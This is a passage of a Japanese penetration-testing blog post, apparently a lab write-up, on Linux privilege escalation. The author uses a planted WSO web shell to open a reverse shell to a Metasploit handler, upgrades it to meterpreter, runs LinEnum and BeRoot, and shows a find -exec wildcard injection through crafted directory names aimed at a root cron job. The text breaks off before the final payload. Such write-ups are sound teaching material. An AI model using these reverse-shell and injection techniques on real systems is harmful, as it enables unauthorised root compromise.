<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>ペネトレ検証-権限昇格とWildcard Injectionの原理 - Shooting!!!</title>
  <meta property="og:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
  <meta name="twitter:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
  <meta name="description" content="しゅーとです。

引き続きペネトレーションテストの検証をしていきます。
前回の記事はこちら。

ペネトレ検証-ECサイトに侵入">
  <meta property="og:description" content="しゅーとです。

引き続きペネトレーションテストの検証をしていきます。
前回の記事はこちら。

ペネトレ検証-ECサイトに侵入">
  <meta name="twitter:description" content="しゅーとです。

引き続きペネトレーションテストの検証をしていきます。
前回の記事はこちら。

ペネトレ検証-ECサイトに侵入">
  <meta name="author" content="しゅーと"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "Shooting!!!",
    
    "url": "https:\/\/www.shutingrz.com\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/www.shutingrz.com\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/www.shutingrz.com\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/www.shutingrz.com\/post\/ad_hack-linux_priv_escalation\/",
          "name": "ペネトレ検証 権限昇格と wildcard injectionの原理"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "しゅーと"
  },
  "headline": "ペネトレ検証-権限昇格とWildcard Injectionの原理",
  "description" : "しゅーとです。\n引き続きペネトレーションテストの検証をしていきます。\n前回の記事はこちら。\n ペネトレ検証-ECサイトに侵入\n",
  "inLanguage" : "en",
  "wordCount":  1434 ,
  "datePublished" : "2019-05-13T03:15:21",
  "dateModified" : "2019-05-13T03:15:21",
  "image" : "https:\/\/www.shutingrz.com\/",
  "keywords" : [ "pentest, priv_escalation, ethical_hacking" ],
  "mainEntityOfPage" : "https:\/\/www.shutingrz.com\/post\/ad_hack-linux_priv_escalation\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/www.shutingrz.com\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/www.shutingrz.com\/",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>

<meta property="og:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
<meta property="og:description" content="しゅーとです。

引き続きペネトレーションテストの検証をしていきます。
前回の記事はこちら。

ペネトレ検証-ECサイトに侵入">
<meta property="og:url" content="https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="Shooting!!!" />
  <meta name="twitter:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
  <meta name="twitter:description" content="しゅーとです。

引き続きペネトレーションテストの検証をしていきます。
前回の記事はこちら。

ペネトレ検証-ECサイトに侵入">
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@shutingrz" />
  <meta name="twitter:creator" content="@shutingrz" />
  <link href='https://www.shutingrz.com/img/favicon.ico' rel='icon' type='image/x-icon'/>
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@shutingrz" />
  <meta name="twitter:creator" content="@shutingrz" />
  <meta property="og:url" content="https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/" />
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="Shooting!!!" />

  <meta name="generator" content="Hugo 0.55.6" />
  <link rel="alternate" href="https://www.shutingrz.com/index.xml" type="application/rss+xml" title="Shooting!!!"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://www.shutingrz.com/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://www.shutingrz.com/css/syntax.css" /><link rel="stylesheet" href="https://www.shutingrz.com/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-137567513-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://www.shutingrz.com/">Shooting!!!</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Blog" href="/">Blog</a>
            </li>
          
        
          
            <li>
              <a title="Blog Tags" href="/tags">Blog Tags</a>
            </li>
          
        
          
            <li class="navlinks-container">
              <a class="navlinks-parent">Special Contents</a>
              <div class="navlinks-children">
                
                  <a href="/pages/oreore-coin">自作仮想通貨入門</a>
                
              </div>
            </li>
          
        
          
            <li>
              <a title="About" href="/pages/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="post-heading">
              
                <h1>ペネトレ検証-権限昇格とWildcard Injectionの原理</h1>
              
              
              
              
                <span class="post-meta">
  
  
  <i class="fas fa-calendar"></i>&nbsp;Posted on May 13, 2019
  
  
  
  
    &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;しゅーと
  
  
</span>


              
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <p>しゅーとです。</p>

<p>引き続きペネトレーションテストの検証をしていきます。<br />
前回の記事はこちら。<br />
<br/>
<a href="/post/ad_hack-ec_exploit/">ペネトレ検証-ECサイトに侵入</a></p>

<hr />

<p>前回はECShopの脆弱性を用いてRCE、そしてwww-data権限でのバックドア作成に成功しました。</p>

<p>今回はLinuxでの権限昇格です。</p>

<h3 id="権限昇格したい">権限昇格したい！</h3>

<p>現状コントロールできているのはwww-dataユーザの権限であり、rootではありません。</p>

<p>ここから横展開するにあたり、root権限はぜひとも取っておきたいものです。<br />
そこで今回は権限昇格できるかを調査・試行します。</p>

<p>またfindコマンドに対するWildcard Injection を用いた侵害の説明をふんだんにしています。</p>

<p>そして今回も攻撃後にブルーチーム目線で攻撃の痕跡がどう残っているかも確認します。</p>

<hr />

<h1 id="metapreterでラクラクやりたい">metapreterでラクラクやりたい</h1>

<p>現状の手札は、永続化のために設置したWSOのバックドア（www-dataユーザ）のみ。</p>

<p>特権昇格など色々な試行をするためにmeterpreterは便利なので使うことにします。</p>

<p>ECShopが稼働しているサーバにncコマンドは入っていませんでしたが、WSOはリバースシェル接続の機能があります。<br />
そのためWSOのリバースシェル経由で meterpreter に接続します。</p>

<p>まずはAttackerのmsfで普通の shell/reverse_tcp を待ち受けます。</p>

<pre><code>msf5 exploit(multi/handler) &gt; show options
(snip)
Payload options (linux/x64/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.22     yes       The listen address (an interface may be specified)
   LPORT  12345            yes       The listen port
(snip)

msf5 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.22:12345 

</code></pre>

<p>WSO の Network toolsで、リバースシェルを張りにいきます。</p>


<link rel="stylesheet" href="/css/hugo-easy-gallery.css" />
<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./wso_reverse.png" alt="./wso_reverse.png"/>
    </div>
    <a href="./wso_reverse.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p><br/></p>

<pre><code>[*] Sending stage (38 bytes) to 192.168.2.24
[*] Command shell session 1 opened (192.168.2.22:12345 -&gt; 192.168.2.24:47686) at 2019-05-12 03:35:59 +0900
</code></pre>

<p>きました。</p>

<p>次はmeterpreterにスイッチします。スイッチには shell_to_meterpreter を使います。</p>

<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.
</code></pre>

<p><br/></p>

<p>実行します。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./switch_meterpreter.png" alt="./switch_meterpreter.png"/>
    </div>
    <a href="./switch_meterpreter.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>無事 meterpreter へスイッチできました。</p>

<p>セッションを見てみます。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./switch_meterpreter_sessions.png" alt="./switch_meterpreter_sessions.png"/>
    </div>
    <a href="./switch_meterpreter_sessions.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p><br/>
id: 2 は WSO からリバースシェル接続したセッションです。<br />
id: 3 は id:2のセッションを使って注入・接続したmeterpreterセッションです。</p>

<p><br/></p>

<h4 id="小ネタ-どのようにmeterpreterにスイッチされる">(小ネタ)どのようにmeterpreterにスイッチされる？</h4>

<p>msfconsoleではshellからmeterpreterを起動させましたが、実際metasploitはどのようにやっているのでしょう。<br />
実際にパケットをとってみると以下のようになっていました。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./switch_meterpreter_pcap.png" alt="./switch_meterpreter_pcap.png"/>
    </div>
    <a href="./switch_meterpreter_pcap.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>ワンライナーでmeterpreterのstagerをvictimに実行させてるんですね。<br />
stagerはLHOSTに記載のホストに接続し、meterpreter stageを読み込み、実行します。<br />
なお、ワンライナーの内容の通り、/tmpにランダム文字列で一時的にファイルを保存しますが、stagerが起動したらファイルは削除されます。</p>

<hr />

<h1 id="権限昇格の可能性の調査">権限昇格の可能性の調査</h1>

<p>meterpreterも手に入ったところで、権限昇格できるか色々調査していきます。</p>

<p>Linuxに対する権限昇格については以下の記事が参考になりました。</p>

<blockquote>
<p><a href="https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/">https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/</a></p>
</blockquote>

<p>後述するLinEnum、BeRootの詳細も書かれていて良記事です。</p>

<h3 id="各種情報の取得">各種情報の取得</h3>

<p>LinEnumを使います。<br />
LinEnumは、システムの設定不備によって権限昇格が行える箇所がないかチェックするスクリプトです。<br />
その他、嬉しい情報も集めてくれます。</p>

<p>meterpreterでvictimにアップロードし実行。</p>

<pre><code>meterpreter &gt; upload LinEnum.sh /tmp/.session
[*] uploading  : LinEnum.sh -&gt; /tmp/.session
[*] uploaded   : LinEnum.sh -&gt; /tmp/.session/LinEnum.sh
meterpreter &gt; shell
Process 1613 created.
Channel 4 created.

pwd
/tmp/.session
chmod u+x LinEnum.sh

./LinEnum.sh | tee LinEnum_out.txt
</code></pre>

<p>結果は非常に長大なため省略します。</p>

<p>結果をみたところ即脆弱性につながる情報はありませんでしたが、以下のいい情報が得られました。</p>

<pre><code class="language-bash">uid=105(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(ecadmin) gid=1000(ecadmin) groups=1000(ecadmin)

(snip)

[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x 1 root    root    4.0K May 11 18:58 .
drwxr-xr-x 1 root    root    4.0K May 11 18:50 ..
drwxr-xr-x 3 ecadmin ecadmin 4.0K May 11 19:40 ecadmin

(snip)

/etc/cron.daily:
total 56
drwxr-xr-x 1 root root  4096 May 11 19:37 .
drwxr-xr-x 1 root root  4096 May 11 18:58 ..
-rw-r--r-- 1 root root   102 Mar 21 19:45 .placeholder
-rwxr-xr-x 1 root root   625 Mar 31  2018 apache2
-rwxr-xr-x 1 root root 15000 Dec 11  2016 apt
-rwxr-xr-x 1 root root   695 May 11 19:39 bakProductImage.sh
-rwxr-xr-x 1 root root  1597 May  2  2016 dpkg
-rwxr-xr-x 1 root root  4125 Feb 10  2018 exim4-base
-rwxr-xr-x 1 root root   249 May 17  2017 passwd

(snip)

### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1305  0.0  0.0  55184  2824 ?        Ss   18:59   0:00 /usr/sbin/sshd


</code></pre>

<p>この結果から、3つのことがわかります。</p>

<ul>
<li>sshが2222/tcpで動いている<br /></li>
<li>ecadminというユーザが存在する<br /></li>
<li>/etc/cron.dailyに「bakProductImage.sh」という恐らく自作のシェルスクリプトがある<br /></li>
</ul>

<p>※/etc/cron.daily/ 配下のスクリプトは、cronによって日次で実行されるものです。</p>

<h3 id="脆弱性の有無調査">脆弱性の有無調査</h3>

<p>BeRootを使います。<br />
BeRootはプラットフォームの脆弱性を調査するlinux-exploit-suggesterというスクリプトの機能に加えて、汎用的に発生しがちな脆弱性も調査してくれるスクリプトです。</p>

<p>meterpreterでvictimにアップロードし実行。</p>

<pre><code>
meterpreter &gt; upload beroot_linux.tar /tmp/.session
[*] uploading  : beroot_linux.tar -&gt; /tmp/.session  
[*] uploaded   : beroot_linux.tar -&gt; /tmp/.session/beroot_linux.tar
meterpreter &gt; shell
Process 2088 created.
Channel 6 created.

tar xf beroot_linux.tar 
(snip)

cd beroot_linux
python beroot.py

</code></pre>

<p>実行した結果、プラットフォームに関する脆弱性はありませんでした。</p>

<p>しかし、汎用的な脆弱性を見つけるルーチンで意外なものを見つけました。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./beroot_out.png" alt="./beroot_out.png"/>
    </div>
    <a href="./beroot_out.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>サーバ管理者が設置した「bakProductImage.sh」に脆弱性があるかもしれないという示唆です。</p>

<p><br/></p>

<h3 id="bakproductimage-sh-の調査">bakProductImage.sh の調査</h3>

<p>さて、LinEnumとBeRootで見つけたbakProductImage.shが何者かを調べます。</p>

<pre><code class="language-bash">#!/bin/bash


bakDir(){
        img_dir_path=$1
        dir_name=`basename $img_dir_path`
        tar -C `dirname $img_dir_path` -cf $work_dir/$dir_name.tar $dir_name
}


ecshop_dir=/var/www/html
bak_dir=/var/backups/ecshop
date=`date +&quot;%Y%m%d&quot;`

TMP=`mktemp -d`
trap &quot;rm -rf $TMP&quot; EXIT
work_dir=$TMP/$date

mkdir $work_dir

#archive product image dir
image_dirs=` find $ecshop_dir/images -maxdepth 1 -name &quot;*&quot; -type d `

for dir in $image_dirs; do
        isProductDir=`find $dir -maxdepth 1 -name 'goods_img' -type d  |wc -l`
        if [ $isProductDir -eq 1 ]; then
                bakDir $dir
        fi
done

#backup
tar -C `dirname $work_dir` -cf $bak_dir/$date.tar `basename $work_dir`
chown ecadmin $bak_dir/$date.tar

rm -rf $TMP

</code></pre>

<p>ECShopのサイトにある商品画像をバックアップするスクリプトのようです。<br />
パッと見は普通のスクリプトですね。</p>

<p>findコマンドで「/var/www/html/images/」直下のディレクトリを取得し、<br />
そのディレクトリの直下に&rdquo;goods_img&rdquo;ディレクトリが存在するかを確認します。<br />
goods_imgディレクトリが存在したらそのディレクトリはバックアップ対象になるようですね。</p>

<p>保存先は /var/backups/ecshop で、%Y%m%d.tar の形式でアーカイブされるようです。</p>

<pre><code class="language-shell">ls -la /var/backups/ecshop/|tail -n 3
-rw-r--r-- 1 ecadmin root 4700160 May  9 01:00 20190509.tar
-rw-r--r-- 1 ecadmin root 4700160 May 10 01:00 20190510.tar
-rw-r--r-- 1 ecadmin root 4700160 May 11 01:00 20190511.tar
</code></pre>

<p>日時を見るに、毎日1時にcronが走っているんですね。</p>

<p>また、以下からcronはroot権限で行われていることが推測できます。</p>

<ul>
<li>スクリプト内の最後でchownで所有者をecadminに変更している</li>
<li>バックアップ先のファイルの所有グループがrootのまま</li>
</ul>

<p><br/></p>

<h3 id="ここまででわかっていること">ここまででわかっていること</h3>

<p>今までの情報が多かったので、一旦まとめます。</p>

<ul>
<li>LinEnumの結果から、設定不備による特権昇格はできなさそう</li>
<li>BeRootの結果から、OSにインストールされているサーバソフトウェアに脆弱性はない</li>
<li>BeRootの結果から、cron.dialy/bakProductImage.sh には find 周りに脆弱性がありそう</li>
<li>バックアップファイルの所有者・所有グループから、cronはroot権限で実行されてそう</li>
</ul>

<p><br/></p>

<h1 id="wildcard-injectionの原理と検証">Wildcard Injectionの原理と検証</h1>

<p>BeRootは bakProductImage.shのfindコマンドに脆弱性の可能性ありと指摘しました。</p>

<p>bakProductImage.sh のfind周りを見てみます。</p>

<pre><code class="language-bash">image_dirs=` find $ecshop_dir/images -maxdepth 1 -name &quot;*&quot; -type d `

for dir in $image_dirs; do
        isProductDir=`find $dir -maxdepth 1 -name 'goods_img' -type d  |wc -l`
        if [ $isProductDir -eq 1 ]; then
                bakDir $dir
        fi
done
</code></pre>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./bak_find.png" alt="./bak_find.png"/>
    </div>
    <a href="./bak_find.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>本スクリプトでは find が2箇所登場しています。</p>

<p>まずは2つ目の find の対象パスに注目します。</p>

<p>「find $dir 」とありますが、$dir とは $image_dirs 配列の要素です。<br />
そして $image_dirs は 「find $ecshop_dir/images 」の結果です。<br />
さらに、最初のfind の検索条件は 「&rdquo;*&ldquo;」 と書いてあるとおり、任意のものをマッチさせます。<br />
（-type dなのでディレクトリが検索条件）</p>

<p>任意のディレクトリの名前をそのままfindに渡しているということですね。<br />
つまり⚠️危険⚠️な名前のディレクトリを作成すれば、findはその名前で色々やってくれるということです。</p>

<p>この仕様を利用した攻撃を <strong>Wildcard Injection</strong> といいます。</p>

<p>しかも今回、/var/www/html/images は公開ディレクトリでした。<br />
このディレクトリはwww-dataユーザに書き込み権限があるので、自由にディレクトリを作成することができます。(ここが一番キモ)</p>

<p><br/></p>

<h2 id="find-コマンドの-おさらい">find コマンドの おさらい</h2>

<p>攻撃の前に、find コマンドのおさらいをします。<br />
<br/>
find コマンドには、-exec という便利なオプションがあります。<br />
まずは実験のため、自分の環境で/tmp/images/ ディレクトリを作成します。<br />
そしてその配下に 201903, 201904, 201905 ディレクトリを作成します。<br />
（面白いのでぜひみんなも試してくれよな）
<br/></p>

<pre><code class="language-shell">$ mkdir /tmp/images/
$ cd /tmp/images
$ mkdir 201903 201904 201905
$ ls
201903  201904  201905

</code></pre>

<p><br/>
find はご存知の通り、ファイルやディレクトリを検索するコマンドです。<br />
-exec オプションは、検索にマッチしたパスに対して、パスごとにOSコマンドを適用できます。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ find *
201903
201904
201905

shu@kali:/tmp/images$ find * -exec echo &quot;Path:{}&quot; \;
Path:201903
Path:201904
Path:201905
</code></pre>

<p>※{}はマッチしたものが入る変数です。<br />
※「\;」は-execの終了を示す記号です。<br />
  本当は「;」ですが、「;」はシェルでコマンドの区切りを示す特殊文字なのでエスケープしています。</p>

<p>上記ではechoを使いましたが、別にどんなOSコマンドでも問題ないです。<br />
{}を使う必要もなし。以下みたいに。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ find * -exec uname \;
Linux
Linux
Linux
</code></pre>

<p>unameを使ってみました。3つのディレクトリが存在するので3回unameされてます。</p>

<p>当然touch コマンドとかもいいです。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ find * -exec touch Test \;
shu@kali:/tmp/images$ ls -l
total 12
drwxr-xr-x 2 shu shu 4096 May 13 07:15 201903
drwxr-xr-x 2 shu shu 4096 May 13 07:15 201904
drwxr-xr-x 2 shu shu 4096 May 13 07:15 201905
-rw-r--r-- 1 shu shu    0 May 13 07:25 Test
</code></pre>

<p>findコマンドの仕組み上ディレクトリの数だけ同じコマンドが実行されるので、冪等性が保たれるようにしましょう。<br />
(状態をスイッチするコマンドとかは冪等性が保たれないのでここで使うのはよくない🙅)</p>

<p>なお、findコマンドを実行したユーザの権限でOSコマンドが実行されます。</p>

<p><br/></p>

<h2 id="wildcard-injection-の原理">WildCard Injection の原理</h2>

<p>次はこの-execの仕組みを利用して攻撃を試行します。</p>

<h3 id="実験環境の作成">実験環境の作成</h3>

<p>実験用にbakProductImage.shのfind部分を再現したシェルを作成し、vuln.shとして保存します。</p>

<pre><code class="language-bash">#!/bin/bash
image_dirs=` find /tmp/images -mindepth 1 -maxdepth 1 -name &quot;*&quot; -type d`

for dir in $image_dirs; do
	echo &quot;find $dir -maxdepth 1 -name 'goods_img' -type d &quot;
	     find $dir -maxdepth 1 -name 'goods_img' -type d 
	echo &quot;===&quot;
done
</code></pre>

<p><br/>
試しに実行してみます。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ bash vuln.sh
find /tmp/images/201904 -maxdepth 1 -name 'goods_img' -type d
===
find /tmp/images/201905 -maxdepth 1 -name 'goods_img' -type d
===
find /tmp/images/201903 -maxdepth 1 -name 'goods_img' -type d
===
</code></pre>

<p>/tmp/imagesにあるディレクトリ3つに対してさらにfindが実行されました。<br />
echoだけがあって2つめのfindの結果が表示されないのは、各ディレクトリに&rdquo;goods_img&rdquo;が存在せず検索にマッチしなかったからです。</p>

<p>試しに201903のディレクトリにgoods_imgディレクトリを作成します。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ mkdir 201903/goods_img
</code></pre>

<p><br/>
再度実行してみます。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ bash vuln.sh
find /tmp/images/201904 -maxdepth 1 -name 'goods_img' -type d
===
find /tmp/images/201905 -maxdepth 1 -name 'goods_img' -type d
===
find /tmp/images/201903 -maxdepth 1 -name 'goods_img' -type d
/tmp/images/201903/goods_img
===
</code></pre>

<p>201903ディレクトリだけ2つ目のfindでマッチ結果が実行されていますね。</p>

<p><br/></p>

<h3 id="危険-なディレクトリを作成する">⚠️危険⚠️なディレクトリを作成する</h3>

<p>ディレクトリ名が $dir の形で 2つめのfindに渡されているということは、<br />
⚠️危険⚠️な名前のディレクトリを作成すれば任意のコマンドが実行できるということです。</p>

<p>以下のようにディレクトリ名とは思えないディレクトリを作成します。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec touch hack ;&quot;
shu@kali:/tmp/images$ ls -l
total 20
drwxr-xr-x 3 shu shu 4096 May 13 07:48  201903
drwxr-xr-x 2 shu shu 4096 May 13 07:50  201904
drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
drwxr-xr-x 2 shu shu 4096 May 13 08:04 '* -exec touch hack ;'
-rw-r--r-- 1 shu shu  245 May 13 07:45  vuln.sh
</code></pre>

<p>「* -exec touch hack ;」という名前のディレクトリを作成しました。<br />
先程のfindの結果のとおりパスがマッチしないと-execが実行されないので最初に「*」を、<br />
また -exec の終端を示すため末尾に「;」を付与しています。</p>

<p>さて、この状態でもう一度vuln.shを実行します。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./find_test_injection.png" alt="./find_test_injection.png"/>
    </div>
    <a href="./find_test_injection.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>エラーが大量に出ていますね。大量のエラーはインジェクション系攻撃の宿命です。</p>

<p>危険なディレクトリを使ったfindはどうなっているでしょうか。下に抜粋します。</p>

<pre><code class="language-bash">find /tmp/images/* -exec touch hack ; -maxdepth 1 -name 'goods_img' -type d
</code></pre>

<p>/tmp/images/* で引っかかったものに対して touch hack を行うという内容になっています。</p>

<p>ディレクトリの状態を見ます。</p>



<div class="box" >
  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <div class="img">
      <img itemprop="thumbnail" src="./find_test_injection_ls.png" alt="./find_test_injection_ls.png"/>
    </div>
    <a href="./find_test_injection_ls.png" itemprop="contentUrl"></a>
  </figure>
</div>


<p>hackファイルが作成されていますね。実験環境でWildcard Injectionが成功しました💪</p>

<p>これをcronがroot権限でやってくれると権限昇格が捗りますね。　←ここ一番キモ</p>

<p><br/></p>

<h3 id="exec-の使い勝手を良くする">-exec の使い勝手を良くする</h3>

<p>前項でWildcard Injectionは成功しましたが、これだけでは侵害には使いにくいです。<br />
これは以下の理由によるものです。</p>

<ul>
<li>-exec は単一コマンドしか使えない</li>
<li>ディレクトリ名には「/」が使えないので、ファイル操作が困難<br />
パスが通ってないディレクトリの自作スクリプトを指定することもできません。</li>
<li>引数にスペースを含められない<br />
これはforとfindの問題だと思いますが・・・。</li>
</ul>

<p>ただ、単一コマンドしか使えない場合でも、例えば bashなら bash -c を使ってワンライナーで複数コマンドを書くことができます。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ bash -c &quot;echo aaa; echo bbb&quot;
aaa
bbb
</code></pre>

<p>しかしながら、今回のfor内のfindではスペースが使えません。<br />
実際に試してみます。</p>

<pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec bash -c \&quot;touch aaa\&quot; ;&quot;
shu@kali:/tmp/images$ bash vuln.sh
(snip)
===
find /tmp/images/* -exec bash -c &quot;touch aaa&quot; ; -maxdepth 1 -name 'goods_img' -type d
(snip)
aaa&quot;: -c: line 0: unexpected EOF while looking for matching `&quot;'
aaa&quot;: -c: line 1: syntax error: unexpected end of file
(snip)

shu@kali:/tmp/images$ ls -l
total 20
drwxr-xr-x 3 shu shu 4096 May 13 07:48  201903
drwxr-xr-x 2 shu shu 4096 May 13 07:50  201904
drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
drwxr-xr-x 2 shu shu 4096 May 13 08:34 '* -exec bash -c &quot;touch aaa&quot; ;'
-rw-r--r-- 1 shu shu  245 May 13 07:45  vuln.sh

</code></pre>

<p>findでスペースの部分がEOF(EOL)として扱われるため、エラーがでてコマンドの実行に失敗してしまうのです。</p>

<h3 id="pythonによるワンライナー">Pythonによるワンライナー</h3>

<p>このままでは単一コマンドしか使えないので、侵害には使いづらいです。<br />
